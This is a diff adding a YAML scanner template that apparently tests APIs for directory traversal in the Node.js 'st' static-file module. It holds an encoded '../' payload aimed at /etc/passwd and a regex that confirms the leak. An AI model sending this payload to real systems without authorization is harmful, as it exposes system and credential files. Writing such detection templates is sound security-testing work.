@@ -1,0 +1,64 @@
+id: NODEJS_ST_MODULE_DIRECTORY_TRAVERSAL
+info:
+  name: "Node.js st Module Directory Traversal"
+  description: "Node.js `st` Module Directory Traversal is a vulnerability where attackers exploit the `st` static file serving module to access files outside the intended directory. If the module fails to sanitize file paths properly, attackers can use crafted requests with `../` sequences to read sensitive files on the server. This can expose configuration files, credentials, or other restricted data, compromising the application’s security."
+  details: "Node.js `st` Module Directory Traversal occurs when the `st` module, used for serving static files, fails to validate or sanitize user-provided file paths. Attackers craft requests with directory traversal sequences like `../` to access files outside the intended root directory. This can lead to unauthorized exposure of sensitive files such as environment variables, source code, or system configurations, increasing the risk of further exploits."
+  impact: "The impact of Node.js `st` Module Directory Traversal includes unauthorized access to sensitive server files, such as configuration files, environment variables, or source code. This can lead to information disclosure, aiding attackers in escalating attacks like credential theft or code exploitation. Such breaches can compromise application security, user data, and system integrity, resulting in significant reputational and financial damage."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: NODEJS_ST_MODULE_DIRECTORY_TRAVERSAL
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - '/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "${paths}"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex: "root:.*:0:0:"
+    not_contains:
+      - <html>
+      - </html>
+strategy:
+  run_once: /
